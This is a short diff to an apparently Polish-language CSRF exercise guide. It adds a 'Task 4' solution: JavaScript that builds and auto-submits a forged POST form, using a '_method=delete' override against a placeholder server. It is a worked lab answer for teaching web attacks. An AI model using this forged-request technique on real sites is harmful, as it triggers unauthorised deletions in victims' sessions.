@@ -71,4 +71,15 @@ Aby przeprowadzić atak, należy stworzyć osobną stronę HTML (atakującą), k
 
   form.submit();
   ```
+
+  ### Zadanie 4
+
+  ```js
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = '<SERVER>/task4?_method=delete';
+  document.body.appendChild(form);
+
+  form.submit();
+  ```
 </details>
